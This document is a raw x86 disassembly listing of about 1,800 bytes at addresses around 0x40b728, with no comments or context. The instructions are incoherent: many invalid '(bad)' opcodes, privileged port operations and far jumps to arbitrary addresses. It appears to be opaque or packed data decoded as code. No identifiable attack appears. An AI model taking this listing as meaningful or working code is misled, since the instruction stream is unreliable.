  40b728:	call   0x5b6d:0xd008c35f
  40b72f:	mov    al,0xe6
  40b731:	xchg   esi,eax
  40b732:	in     al,0x74
  40b734:	or     DWORD PTR [edx],0xa554a4df
  40b73a:	clc    
  40b73b:	cdq    
  40b73c:	sar    BYTE PTR [ecx+0x2f],1
  40b73f:	pop    es
  40b740:	push   ecx
  40b741:	daa    
  40b742:	cli    
  40b743:	pusha  
  40b744:	xor    BYTE PTR [esi+0x57],bh
  40b747:	mov    al,ds:0x73323351
  40b74c:	jmp    0x7e3:0xb981b847
  40b753:	jmp    DWORD PTR [esp+edx*2+0x2a862c5c]
  40b75a:	mov    al,BYTE PTR [esi+ecx*8+0x5b]
  40b75e:	out    dx,al
  40b75f:	xor    DWORD PTR [edi],edx
  40b761:	cmp    ebx,DWORD PTR [eax+0x7ae031de]
  40b767:	add    esp,ebp
  40b769:	daa    
  40b76a:	adc    dh,BYTE PTR [esi-0x10]
  40b76d:	mov    eax,0x7a2c4b73
  40b772:	adc    dh,BYTE PTR [esi]
  40b774:	scas   al,BYTE PTR es:[edi]
  40b775:	data16 mov bl,0x66
  40b778:	lea    edx,[esi]
  40b77a:	pop    ecx
  40b77b:	cdq    
  40b77c:	lock and BYTE PTR [eax-0x39feb838],ah
  40b783:	adc    eax,0xee86c723
  40b788:	ror    BYTE PTR ds:0xed42239b,cl
  40b78e:	pop    es
  40b78f:	loopne 0x40b7b7
  40b791:	or     DWORD PTR [ebp-0x7d],edx
  40b794:	mov    eax,es:0x6cb2598b
  40b79a:	mov    dl,BYTE PTR ds:0xa3743a0
  40b7a0:	loopne 0x40b7dc
  40b7a2:	jb     0x40b7cd
  40b7a4:	or     ebp,DWORD PTR [esi-0x5d]
  40b7a7:	xchg   edi,eax
  40b7a8:	sub    edi,ebx
  40b7aa:	jmp    0x8b42:0x6c2e765f
  40b7b1:	retf   0xb646
  40b7b4:	cli    
  40b7b5:	cs jmp 0xd497abbb
  40b7bb:	jmp    0x277cb514
  40b7c0:	ins    DWORD PTR es:[edi],dx
  40b7c1:	pop    esi
  40b7c2:	popa   
  40b7c3:	ja     0x40b765
  40b7c5:	jne    0x40b77d
  40b7c7:	into   
  40b7c8:	or     dl,bl
  40b7ca:	loop   0x40b7f4
  40b7cc:	adc    BYTE PTR [edx+0x58a6276],al
  40b7d2:	mov    ah,0x0
  40b7d4:	std    
  40b7d5:	push   0x858addcb
  40b7da:	xchg   ebp,eax
  40b7db:	and    eax,0xe9a75cb8
  40b7e0:	cmp    al,0x57
  40b7e2:	aam    0xac
  40b7e4:	arpl   WORD PTR [ebx],cx
  40b7e6:	data16 icebp 
  40b7e8:	sub    ah,BYTE PTR fs:[edi]
  40b7eb:	test   edx,ebx
  40b7ed:	mul    DWORD PTR [edx+ebp*1+0x121648d7]
  40b7f4:	fistp  DWORD PTR [ecx]
  40b7f6:	int3   
  40b7f7:	mov    edx,0x8c2bf3fb
  40b7fc:	mov    ?,WORD PTR [edi]
  40b7fe:	sub    eax,DWORD PTR [esi-0x6d]
  40b801:	shr    BYTE PTR ds:0x350297fb,cl
  40b807:	arpl   WORD PTR [edx],di
  40b809:	daa    
  40b80a:	sbb    DWORD PTR [eax],edi
  40b80c:	not    esi
  40b80e:	vunpckhps ymm6,ymm5,YMMWORD PTR [edx]
  40b812:	leave  
  40b813:	not    BYTE PTR [edi-0x1d53b06e]
  40b819:	pop    edi
  40b81a:	fisttp DWORD PTR [ebp-0x4ad511c2]
  40b820:	scas   al,BYTE PTR es:[edi]
  40b821:	rol    DWORD PTR [edi+0x33125533],0x92
  40b828:	std    
  40b829:	xchg   ebp,eax
  40b82a:	and    al,0x16
  40b82c:	inc    edi
  40b82d:	inc    edx
  40b82e:	jo     0x40b7e1
  40b830:	push   0xd186393f
  40b835:	dec    ecx
  40b836:	in     al,0x23
  40b838:	or     eax,0x64a9ff19
  40b83d:	lahf   
  40b83e:	js     0x40b7ee
  40b840:	imul   eax,edx,0x2dd9b232
  40b846:	test   esp,edi
  40b848:	adc    ah,dl
  40b84a:	sub    bl,bh
  40b84c:	jo     0x40b82a
  40b84e:	leave  
  40b84f:	pop    edi
  40b850:	and    eax,0xd4010069
  40b855:	jnp    0x40b8c4
  40b857:	(bad)  
  40b858:	push   ebp
  40b859:	bound  esp,QWORD PTR [ecx-0x704323ad]
  40b85f:	nop
  40b860:	rcl    BYTE PTR [ecx+ebx*4-0x34],cl
  40b864:	dec    ecx
  40b865:	loop   0x40b8c2
  40b867:	ins    BYTE PTR es:[edi],dx
  40b868:	(bad)  
  40b869:	cmc    
  40b86a:	into   
  40b86b:	iret   
  40b86c:	fcmovbe st,st(0)
  40b86e:	ret    
  40b86f:	(bad)
  40b872:	jns    0x40b85c
  40b874:	inc    esp
  40b875:	in     eax,dx
  40b876:	rcr    DWORD PTR [esi+0x7b],cl
  40b879:	xchg   ecx,eax
  40b87a:	dec    ecx
  40b87b:	fwait
  40b87c:	jae    0x40b822
  40b87e:	lods   ax,WORD PTR ds:[esi]
  40b880:	(bad)  
  40b881:	outs   dx,BYTE PTR ds:[esi]
  40b882:	xchg   ecx,eax
  40b883:	dec    esp
  40b884:	push   ss
  40b885:	jo     0x40b8c3
  40b887:	pop    ebp
  40b888:	and    ebp,DWORD PTR [edx+eax*4+0x564fabcf]
  40b88f:	ret    
  40b890:	sub    edx,DWORD PTR [ebx+0x57]
  40b893:	jo     0x40b89d
  40b895:	dec    eax
  40b896:	shl    DWORD PTR [ebx],1
  40b898:	xchg   BYTE PTR [ebp+ecx*8-0x6a],bh
  40b89c:	push   ss
  40b89d:	add    eax,0x95cc4c83
  40b8a2:	push   ds
  40b8a3:	je     0x40b87f
  40b8a5:	fdivr  QWORD PTR ds:[eax-0x30f3e4ad]
  40b8ac:	inc    ebp
  40b8ad:	pop    edi
  40b8ae:	mov    ebx,0xd4b3493
  40b8b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b8b4:	fdivrp st(5),st
  40b8b6:	push   esi
  40b8b7:	xchg   ebx,eax
  40b8b8:	mov    edi,0xc807d0bb
  40b8be:	mov    BYTE PTR [ecx+0x63a2c6d4],bh
  40b8c4:	ds inc edi
  40b8c6:	mov    al,ds:0x965e8cd1
  40b8cb:	arpl   ax,ax
  40b8cd:	pop    es
  40b8ce:	test   dh,ch
  40b8d0:	iret   
  40b8d1:	xchg   ebx,eax
  40b8d2:	je     0x40b8ad
  40b8d4:	mov    al,0x71
  40b8d6:	lods   eax,DWORD PTR ds:[esi]
  40b8d7:	or     edx,edi
  40b8d9:	mov    ds:0x5ac65a1d,eax
  40b8de:	adc    al,0x75
  40b8e0:	outs   dx,BYTE PTR ds:[esi]
  40b8e1:	or     eax,0xbcfc01ee
  40b8e6:	mov    dh,0x9d
  40b8e8:	push   ss
  40b8e9:	jmp    0x40b871
  40b8eb:	or     eax,0x1f6e4151
  40b8f0:	add    esp,DWORD PTR [edx-0x31]
  40b8f3:	dec    eax
  40b8f4:	or     ecx,edx
  40b8f6:	aas    
  40b8f7:	mov    edi,0x9cd4af4
  40b8fc:	pop    eax
  40b8fd:	push   esi
  40b8fe:	mov    cs,edi
  40b900:	cdq    
  40b901:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b902:	jp     0x40b88f
  40b904:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b905:	shr    bl,0x38
  40b908:	xor    al,0xd5
  40b90a:	jl     0x40b923
  40b90c:	mov    ch,BYTE PTR [ebx-0x6f47fa86]
  40b912:	arpl   WORD PTR [esi-0x36d1fcea],di
  40b918:	push   0xec526453
  40b91d:	sbb    esp,DWORD PTR [edi+0x54]
  40b920:	mov    ebp,0x34bc2cd0
  40b925:	mov    ss,WORD PTR [ebx+eiz*2]
  40b928:	sub    eax,0xaa1fb5fd
  40b92d:	add    BYTE PTR [eax+0x3556d74],al
  40b933:	inc    edi
  40b934:	push   esi
  40b935:	push   eax
  40b936:	sbb    edi,eax
  40b938:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b939:	cld    
  40b93a:	dec    edx
  40b93b:	es push esp
  40b93d:	adc    edx,DWORD PTR [bp+di+0x1]
  40b941:	dec    esi
  40b942:	mov    al,dl
  40b944:	jo     0x40b90c
  40b946:	sar    DWORD PTR [edx],0x53
  40b949:	in     al,0x19
  40b94b:	jne    0x40b9bf
  40b94d:	retf   
  40b94e:	fistp  DWORD PTR [ebx-0x34]
  40b951:	cwde   
  40b952:	lods   al,BYTE PTR ds:[esi]
  40b953:	outs   dx,DWORD PTR ds:[esi]
  40b954:	xor    ah,ah
  40b956:	push   ss
  40b957:	mov    ds:0x87fc5289,eax
  40b95c:	jne    0x40b978
  40b95e:	mov    cl,0x33
  40b960:	outs   dx,BYTE PTR ds:[esi]
  40b961:	mov    ch,0x4
  40b963:	sbb    DWORD PTR [esi],edi
  40b965:	icebp  
  40b966:	push   esi
  40b967:	stc    
  40b968:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b969:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b96a:	sub    edi,ecx
  40b96c:	add    BYTE PTR [edx+edi*4+0xf],dl
  40b970:	or     bh,0xea
  40b973:	icebp  
  40b974:	xor    bl,BYTE PTR [ebx]
  40b976:	ins    DWORD PTR es:[edi],dx
  40b977:	adc    ah,BYTE PTR [esi+0xc]
  40b97a:	ret    
  40b97b:	shl    BYTE PTR [edi+0x38],cl
  40b97e:	scas   eax,DWORD PTR es:[edi]
  40b97f:	jmp    0xaa84:0x17a917a
  40b986:	push   edi
  40b987:	and    DWORD PTR [ebp+0x9],edi
  40b98a:	mov    eax,0xd3df3207
  40b98f:	sbb    ebx,0x77cc706
  40b995:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b996:	mov    ebp,0xa6d907fc
  40b99b:	xor    eax,0x636a7df3
  40b9a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b9a1:	xchg   BYTE PTR [edi-0x35e5bbcc],bl
  40b9a7:	mov    DWORD PTR [edx+0x29],edi
  40b9aa:	lds    esi,FWORD PTR [edi+ecx*2-0x993e56]
  40b9b1:	jo     0x40b97c
  40b9b3:	sbb    BYTE PTR [ecx+eax*1],bl
  40b9b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b9b7:	xor    al,0x2c
  40b9b9:	pop    eax
  40b9ba:	cmp    al,0x91
  40b9bc:	stc    
  40b9bd:	ins    BYTE PTR es:[edi],dx
  40b9be:	ja     0x40b9d5
  40b9c0:	add    edi,esi
  40b9c2:	push   esi
  40b9c4:	mov    ebp,0x89ffca79
  40b9c9:	inc    eax
  40b9ca:	pop    esi
  40b9cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b9cc:	das    
  40b9cd:	lods   al,BYTE PTR ds:[esi]
  40b9ce:	std    
  40b9cf:	jle    0x40b97d
  40b9d1:	and    ch,BYTE PTR [edx-0x63]
  40b9d4:	xchg   edi,eax
  40b9d5:	ficomp WORD PTR ds:0x9ae2fc7e
  40b9db:	mov    cl,0x57
  40b9dd:	lock mov eax,ds:0xff3d48dd
  40b9e3:	jp     0x40ba2d
  40b9e5:	bt     DWORD PTR [esi-0x59c59f86],edi
  40b9ec:	mov    cl,0xcb
  40b9ee:	outs   dx,BYTE PTR ds:[esi]
  40b9ef:	pusha  
  40b9f0:	jge    0x40b9bf
  40b9f2:	mov    ebx,DWORD PTR [edx]
  40b9f4:	push   ss
  40b9f5:	jge    0x40ba1c
  40b9f7:	push   ebx
  40b9f8:	mov    eax,DWORD PTR [edi+0x2f]
  40b9fb:	or     edx,DWORD PTR [esi-0x57d90d07]
  40ba01:	not    DWORD PTR [ebx]
  40ba03:	and    eax,0x70722115
  40ba08:	pop    esi
  40ba09:	jecxz  0x40b9c6
  40ba0b:	dec    edx
  40ba0c:	add    BYTE PTR [ecx+0x20],ah
  40ba0f:	ja     0x40ba57
  40ba11:	test   al,0xbe
  40ba13:	adc    ebp,DWORD PTR [edx+0x27]
  40ba16:	push   esp
  40ba17:	push   ss
  40ba18:	pushf  
  40ba19:	adc    al,0xf1
  40ba1b:	cmc    
  40ba1c:	pop    eax
  40ba1d:	mov    edi,0xf0ede28
  40ba22:	addr16 aaa 
  40ba24:	xor    dh,BYTE PTR [esi]
  40ba26:	fs sub eax,ecx
  40ba29:	mov    dh,0xa3
  40ba2b:	mov    ah,BYTE PTR [eax+0x4a]
  40ba2e:	gs sbb eax,0x310613e4
  40ba34:	mov    ?,WORD PTR [esi]
  40ba36:	enter  0x62a1,0x46
  40ba3a:	pop    es
  40ba3b:	aaa    
  40ba3c:	fbld   TBYTE PTR [ebx-0x653cee6b]
  40ba42:	fs stos DWORD PTR es:[edi],eax
  40ba44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba45:	add    bl,BYTE PTR [edi+0x53]
  40ba48:	pusha  
  40ba49:	test   BYTE PTR [eax],cl
  40ba4b:	xchg   DWORD PTR [eax],ebx
  40ba4d:	dec    esp
  40ba4e:	jae    0x40baad
  40ba50:	mov    esp,0x7c4a86cf
  40ba55:	xor    al,BYTE PTR [ecx-0x6a1ad40b]
  40ba5b:	ss and eax,0x3bfe6443
  40ba61:	cmc    
  40ba62:	aaa    
  40ba63:	cmc    
  40ba64:	inc    esi
  40ba65:	pop    ecx
  40ba66:	test   al,0x7b
  40ba68:	fisub  WORD PTR [edi]
  40ba6a:	xchg   edx,eax
  40ba6b:	lods   al,BYTE PTR ds:[esi]
  40ba6c:	jb     0x40ba7f
  40ba6e:	ins    BYTE PTR es:[edi],dx
  40ba6f:	lahf   
  40ba70:	jnp    0x40ba32
  40ba72:	sbb    DWORD PTR [ecx+0xd34acab],ebx
  40ba78:	loope  0x40ba01
  40ba7a:	into   
  40ba7b:	adc    dh,al
  40ba7d:	ins    DWORD PTR es:[edi],dx
  40ba7e:	ret    0xfb45
  40ba81:	jmp    0x973bb7d7
  40ba86:	scas   eax,DWORD PTR es:[edi]
  40ba87:	xchg   ebp,eax
  40ba88:	aaa    
  40ba89:	dec    ebp
  40ba8a:	mov    bl,0xa8
  40ba8c:	push   esp
  40ba8d:	repz ret 0xab06
  40ba91:	push   esi
  40ba92:	(bad)  
  40ba93:	lods   al,BYTE PTR ds:[esi]
  40ba94:	iret   
  40ba95:	xchg   edi,eax
  40ba96:	stc    
  40ba97:	das    
  40ba98:	jae    0x40ba5d
  40ba9a:	inc    ebx
  40ba9b:	lea    ebp,[ebx]
  40ba9d:	ja     0x40ba5c
  40ba9f:	or     eax,0x60069a15
  40baa4:	dec    edi
  40baa5:	int    0x82
  40baa7:	nop
  40baa8:	test   BYTE PTR [eax-0x5],cl
  40baab:	xchg   esp,eax
  40baac:	xchg   ebx,eax
  40baad:	mov    dl,0xe2
  40baaf:	and    BYTE PTR [ebx-0x70aff093],ch
  40bab5:	mov    al,ds:0x77173204
  40baba:	jbe    0x40baba
  40babc:	lock xchg ebx,eax
  40babe:	(bad)  
  40babf:	int    0x26
  40bac1:	mov    esp,0xa3ac9f2c
  40bac6:	nop
  40bac7:	stos   BYTE PTR es:[edi],al
  40bac8:	jmp    0x64e5:0xa5934dee
  40bacf:	jge    0x40ba7a
  40bad1:	jno    0x40bb0d
  40bad3:	fiadd  WORD PTR [ebp+edi*1-0x261e3ebf]
  40bada:	sub    eax,0xb1daa3d9
  40badf:	push   edi
  40bae0:	and    bl,bl
  40bae2:	imul   esi,ebx,0x3d7e9eb9
  40bae8:	mov    eax,ds:0x3caf1417
  40baed:	xchg   ebp,eax
  40baee:	(bad)  
  40baef:	pop    ds
  40baf0:	mov    eax,0xa1fc0551
  40baf5:	mov    edi,0xd2d5640d
  40bafa:	mov    ah,0xa7
  40bafc:	dec    eax
  40bafd:	retf   
  40bafe:	neg    cl
  40bb00:	ins    DWORD PTR es:[edi],dx
  40bb01:	push   ss
  40bb02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb03:	push   edi
  40bb04:	mov    WORD PTR [ecx+eax*4],ds
  40bb07:	push   0xffffffbe
  40bb09:	inc    ecx
  40bb0a:	test   eax,0x298062b0
  40bb0f:	sbb    DWORD PTR [ebx],ebp
  40bb11:	pop    esi
  40bb12:	cmp    BYTE PTR ds:[eax+ebx*4+0x68],dh
  40bb17:	outs   dx,DWORD PTR ds:[esi]
  40bb18:	mov    ?,WORD PTR [ebp-0x7476fb72]
  40bb1e:	enter  0x3042,0xf8
  40bb22:	dec    ebx
  40bb23:	leave  
  40bb24:	std    
  40bb25:	arpl   WORD PTR [ecx+0x23],ax
  40bb28:	xchg   edi,eax
  40bb29:	bound  eax,QWORD PTR [ecx+ebp*4]
  40bb2c:	sbb    al,ch
  40bb2e:	pop    eax
  40bb2f:	pop    edi
  40bb30:	je     0x40bba7
  40bb32:	shl    bh,1
  40bb34:	cmp    eax,0xdf88c177
  40bb39:	and    al,0x1
  40bb3b:	enter  0xb205,0xa5
  40bb3f:	sub    DWORD PTR [ebp-0x2b],esi
  40bb42:	fisub  DWORD PTR [ecx+ecx*1+0x3c]
  40bb46:	mov    DWORD PTR [eax+edi*8+0x58],eax
  40bb4a:	les    ebx,FWORD PTR ss:[ebp-0x3d]
  40bb4e:	rol    DWORD PTR [edi+0x3c7bba92],1
  40bb54:	mov    ecx,0x99ce48f3
  40bb59:	fild   WORD PTR [eax+0x543b47e0]
  40bb5f:	or     eax,0xdbe029a4
  40bb64:	xor    DWORD PTR cs:[esi-0x3d],esp
  40bb68:	mov    ds,WORD PTR [edx-0x526ff369]
  40bb6e:	add    DWORD PTR [eax],ebp
  40bb70:	addr16 lahf 
  40bb72:	scas   al,BYTE PTR es:[edi]
  40bb73:	scas   al,BYTE PTR es:[edi]
  40bb74:	push   edi
  40bb75:	cmp    BYTE PTR [ecx+0xa],0x76
  40bb79:	adc    edx,DWORD PTR [eax*1+0x4b3024c7]
  40bb80:	test   al,0xc4
  40bb82:	push   edi
  40bb83:	cmp    eax,0x42368d3c
  40bb88:	test   eax,0x7313209c
  40bb8d:	jl     0x40bbc4
  40bb8f:	inc    ebx
  40bb90:	and    dl,ch
  40bb92:	ja     0x40bb34
  40bb94:	sub    al,0x12
  40bb96:	jmp    0x5c3ddb5f
  40bb9b:	dec    edx
  40bb9c:	dec    eax
  40bb9d:	push   ebx
  40bb9e:	js     0x40bbca
  40bba0:	pop    ebp
  40bba1:	inc    eax
  40bba2:	in     eax,0x8c
  40bba4:	push   ss
  40bba5:	mov    ch,0x94
  40bba7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bba8:	mov    edx,0xfc090278
  40bbad:	lods   eax,DWORD PTR ds:[esi]
  40bbae:	push   es
  40bbaf:	push   cs
  40bbb0:	shl    BYTE PTR [edx],0x6a
  40bbb3:	sbb    edi,DWORD PTR [esi+0x2dc9682c]
  40bbb9:	popa   
  40bbba:	pusha  
  40bbbb:	xor    cl,dh
  40bbbd:	cwde   
  40bbbe:	repz das 
  40bbc0:	and    al,0x46
  40bbc2:	xchg   ecx,eax
  40bbc3:	(bad)  
  40bbc4:	ds das 
  40bbc6:	mov    eax,ds:0x5fd8bf92
  40bbcb:	and    ecx,DWORD PTR [ebp-0x3d6efbce]
  40bbd1:	int3   
  40bbd2:	mov    eax,ds:0x498153b1
  40bbd7:	mov    esp,0x773b26e0
  40bbdc:	add    eax,0xf64f1c43
  40bbe1:	aad    0x42
  40bbe3:	and    DWORD PTR [edx-0x36143be0],eax
  40bbe9:	(bad)  
  40bbea:	mov    ebp,0x144aba57
  40bbef:	ret    
  40bbf0:	jns    0x40bbe5
  40bbf2:	pmaddwd mm3,QWORD PTR [eax-0x70bd85c2]
  40bbf9:	push   es
  40bbfa:	jnp    0x40bc10
  40bbfc:	dec    edi
  40bbfd:	mov    cl,0xa6
  40bbff:	pop    ds
  40bc00:	jmp    DWORD PTR [ebx-0x53]
  40bc03:	inc    eax
  40bc04:	mov    ebp,0xac5bd9a5
  40bc09:	stos   DWORD PTR es:[edi],eax
  40bc0a:	mov    edi,0xe330f9dd
  40bc0f:	bound  eax,QWORD PTR [ebp-0x68de2514]
  40bc15:	or     al,0x7d
  40bc17:	xadd   BYTE PTR [ecx+0x25],ah
  40bc1b:	or     al,0xd9
  40bc1d:	push   ecx
  40bc1e:	aam    0xe8
  40bc20:	retf   
  40bc21:	test   eax,0x868432db
  40bc26:	sub    cl,BYTE PTR [ebx+0x1a7e3853]
  40bc2c:	inc    esp
  40bc2d:	dec    ebp
  40bc2e:	push   ebx
  40bc2f:	inc    eax
  40bc30:	not    BYTE PTR [ebx-0x5b]
  40bc33:	pop    esi
  40bc34:	sub    al,0xed
  40bc36:	sub    al,0x9a
  40bc38:	mov    ebp,0x9bbe9cdc
  40bc3d:	(bad)  
  40bc3f:	clc    
  40bc40:	adc    dl,BYTE PTR [ebp+edx*8-0x4452d82]
  40bc47:	fstp   QWORD PTR [esi]
  40bc49:	jmp    0x40bc40
  40bc4b:	enter  0xa549,0x77
  40bc4f:	mov    BYTE PTR [ebx+0x5090f156],cl
  40bc55:	aam    0xf6
  40bc57:	mov    WORD PTR [esi-0x22],gs
  40bc5a:	popa   
  40bc5b:	cmp    eax,0xbb7c318f
  40bc60:	push   edi
  40bc61:	iret   
  40bc62:	mov    bh,0x90
  40bc64:	and    DWORD PTR [ebp+0x6ad2cbac],0xffffffa2
  40bc6b:	(bad)  
  40bc6c:	(bad)
  40bc6f:	or     DWORD PTR [eax+0x2e],edi
  40bc72:	(bad)  
  40bc74:	push   esi
  40bc75:	pop    esp
  40bc76:	adc    BYTE PTR [eax],dh
  40bc78:	or     ch,BYTE PTR [ecx-0x6a6d446d]
  40bc7e:	jg     0x40bc1b
  40bc80:	or     ah,BYTE PTR [edi+0x56]
  40bc83:	ror    BYTE PTR ds:0x1999edbd,0x34
  40bc8a:	or     DWORD PTR [edx],eax
  40bc8c:	add    esi,edx
  40bc8e:	(bad)  
  40bc8f:	adc    DWORD PTR [ebx-0x429f48c7],ebp
  40bc95:	adc    ebx,DWORD PTR [esi-0x2b9a8edd]
  40bc9b:	push   ds
  40bc9c:	sbb    eax,0x7e976ca5
  40bca1:	lods   eax,DWORD PTR ds:[esi]
  40bca2:	dec    eax
  40bca3:	xchg   esp,eax
  40bca4:	repnz stc 
  40bca6:	in     eax,dx
  40bca7:	fs cld 
  40bca9:	leave  
  40bcaa:	cli    
  40bcab:	imul   edi,ebp,0x47
  40bcae:	inc    eax
  40bcb0:	lods   al,BYTE PTR ds:[esi]
  40bcb1:	stos   BYTE PTR es:[edi],al
  40bcb2:	pop    edi
  40bcb3:	es ins BYTE PTR es:[edi],dx
  40bcb5:	loop   0x40bc9c
  40bcb7:	add    BYTE PTR [esi+0x216c102c],bl
  40bcbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bcbe:	jno    0x40bd11
  40bcc0:	mov    ebx,0xb1380669
  40bcc5:	sbb    ah,ch
  40bcc7:	lods   eax,DWORD PTR ds:[esi]
  40bcc8:	push   ss
  40bcc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bcca:	sbb    esi,ebx
  40bccc:	daa    
  40bccd:	sahf   
  40bcce:	cmp    DWORD PTR [bx+di+0x45],eax
  40bcd2:	mov    dh,BYTE PTR [ebx+0x647523f0]
  40bcd8:	(bad)  
  40bcd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bcda:	(bad)  
  40bcdb:	int3   
  40bcdc:	jge    0x40bc8d
  40bcde:	fdivr  QWORD PTR [esi]
  40bce0:	cmp    eax,0x5e60cdee
  40bce5:	mov    al,ds:0x61931a43
  40bcea:	jb     0x40bd65
  40bcec:	mov    ebx,0x7e3707d0
  40bcf1:	cmc    
  40bcf2:	push   edx
  40bcf3:	(bad)  
  40bcf5:	xchg   DWORD PTR [edx],edi
  40bcf7:	jmp    0xbe3b18a9
  40bcfc:	mov    al,0x9a
  40bcfe:	mov    ebx,0x9676300c
  40bd03:	push   0xdf0ea896
  40bd08:	stc    
  40bd09:	pop    eax
  40bd0a:	xchg   ecx,eax
  40bd0b:	bound  edi,QWORD PTR [esi]
  40bd0d:	call   0x8c2:0x765a4b2b
  40bd14:	bound  ecx,QWORD PTR [edi-0x7c]
  40bd17:	iret   
  40bd18:	and    al,0x29
  40bd1a:	cmp    DWORD PTR [ebp-0x6b85a3b1],0xffffffc2
  40bd21:	xchg   edi,ecx
  40bd23:	leave  
  40bd24:	mul    DWORD PTR [eax+0x54]
  40bd27:	or     dh,BYTE PTR [si-0x1b]
  40bd2b:	data16 mov dh,0x9e
  40bd2e:	dec    eax
  40bd2f:	fsub   DWORD PTR [esi]
  40bd31:	sub    DWORD PTR [edx-0x64],0xffffff9d
  40bd35:	mov    esp,gs
  40bd37:	dec    esp
  40bd38:	mov    cs,ebp
  40bd3a:	add    DWORD PTR [ecx-0x66],0x31
  40bd3e:	adc    eax,0xe43ffc4f
  40bd43:	(bad)  
  40bd44:	and    al,0x3
  40bd46:	push   cs
  40bd47:	lock jbe 0x40bd1e
  40bd4a:	xchg   edi,eax
  40bd4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd4c:	test   eax,0x2b5e91f6
  40bd51:	div    edi
  40bd53:	mov    al,BYTE PTR [ebx+edx*1]
  40bd56:	inc    edx
  40bd57:	push   sp
  40bd59:	in     al,dx
  40bd5a:	test   BYTE PTR [ebx-0x19991af6],dh
  40bd60:	push   ds
  40bd61:	add    ecx,DWORD PTR cs:[esi-0x1ae93a8b]
  40bd68:	ror    BYTE PTR [esi+0x579483de],1
  40bd6e:	adc    DWORD PTR [esi],edi
  40bd70:	in     eax,dx
  40bd71:	pop    esp
  40bd72:	add    DWORD PTR [eax+edx*4+0x6988124b],0xe8219b62
  40bd7d:	xor    esi,DWORD PTR [eax+ebp*2+0x49]
  40bd81:	cmc    
  40bd82:	int    0x57
  40bd84:	loopne 0x40bdf8
  40bd86:	shl    DWORD PTR [ecx-0x2dc12540],cl
  40bd8c:	loopne 0x40bd33
  40bd8e:	push   ss
  40bd8f:	dec    ebp
  40bd90:	call   0xd19d:0x3a54c3ba
  40bd97:	inc    eax
  40bd98:	push   edx
  40bd99:	jne    0x40bd9a
  40bd9b:	xor    bl,BYTE PTR [eax-0x4a44fa70]
  40bda1:	int    0xe8
  40bda3:	or     dh,BYTE PTR [edx-0x3]
  40bda6:	adc    al,BYTE PTR [ecx]
  40bda8:	idiv   BYTE PTR [ecx+0x59c26baf]
  40bdae:	sbb    edx,DWORD PTR [eax-0x10]
  40bdb1:	dec    edx
  40bdb2:	mov    eax,eax
  40bdb4:	fcomi  st,st(7)
  40bdb6:	cmp    ebp,DWORD PTR [edi+0xd8e7898]
  40bdbc:	xchg   esp,eax
  40bdbd:	add    bh,BYTE PTR [esi-0x25a33dea]
  40bdc3:	mov    BYTE PTR [eax-0x2b],ah
  40bdc6:	and    eax,0x7602549
  40bdcb:	cmp    al,0x80
  40bdcd:	sahf   
  40bdce:	xchg   ebx,eax
  40bdcf:	sub    al,0x97
  40bdd1:	es push ecx
  40bdd3:	sbb    eax,DWORD PTR ds:0x1f0d3b7d
  40bdd9:	icebp  
  40bdda:	in     eax,dx
  40bddb:	not    BYTE PTR ds:0xeaa39c4c
  40bde1:	mov    al,0x39
  40bde3:	xor    eax,0xbcd4c916
  40bde8:	mov    ds:0x22920af4,eax
  40bded:	push   0xffffffcd
  40bdef:	mov    ch,0x44
  40bdf1:	sub    DWORD PTR [ecx+0x42fb3027],0xffffff87
  40bdf8:	jmp    0x4340:0x2c95121b
  40bdff:	xchg   DWORD PTR [ebx+0x42],edi
  40be02:	xor    eax,0x6cfaba48
  40be07:	sahf   
  40be08:	ret    
  40be09:	inc    edx
  40be0a:	push   0xfb90fd02
  40be0f:	xchg   esp,eax
  40be10:	sbb    al,0x9a
  40be12:	fwait
  40be13:	popa   
  40be14:	dec    eax
  40be15:	mov    esi,0x2956f207
  40be1a:	cld    
  40be1b:	dec    esp
  40be1c:	ret    
  40be1d:	push   esp
  40be1e:	inc    esp
  40be1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be20:	sahf   
  40be21:	ret    
  40be22:	repz (bad) 
  40be24:	fs js  0x40be05
  40be27:	mov    ch,0x24
  40be29:	imul   edx,DWORD PTR [edi-0x31],0xffffff97
  40be2d:	sar    ah,cl
  40be2f:	fistp  WORD PTR [ecx+0x322ae006]
  40be35:	aad    0x2b
  40be37:	and    edx,DWORD PTR [esi+eax*2]
  40be3a:	dec    ebx
  40be3b:	icebp  
  40be3c:	shr    ecx,cl
  40be3e:	xor    BYTE PTR [edx-0x6fb51db],0x74
  40be45:	jp     0x40be94
  40be47:	hlt    
  40be48:	aam    0x23
  40be4a:	add    DWORD PTR [ebp-0x2314178b],edx
  40be50:	pop    edi
  40be51:	push   ebp
  40be52:	jg     0x40be1e
  40be54:	(bad)  
  40be56:	mov    ebp,0x44ab36ae
  40be5b:	push   eax
  40be5c:	popa   
  40be5d:	mov    eax,0x2e6c28ec
  40be62:	out    dx,al
  40be63:	xchg   edi,eax
  40be64:	adc    dh,dl
  40be66:	mov    esi,0xbaa6bd5e
  40be6b:	jle    0x40bed4
  40be6d:	dec    ecx
  40be6e:	fstp   QWORD PTR [ebx-0x74]
  40be71:	xchg   edi,eax
  40be72:	aas    
  40be73:	mov    ds:0x1dd98a1f,al
  40be78:	jl     0x40be27
  40be7a:	pusha  
  40be7b:	jp     0x40be51
  40be7d:	cmp    BYTE PTR [esi-0x64],ch
  40be80:	call   0xd76a9faa
  40be85:	xor    esi,DWORD PTR [esi-0xe]
  40be88:	sbb    DWORD PTR [esi+0x10],esp
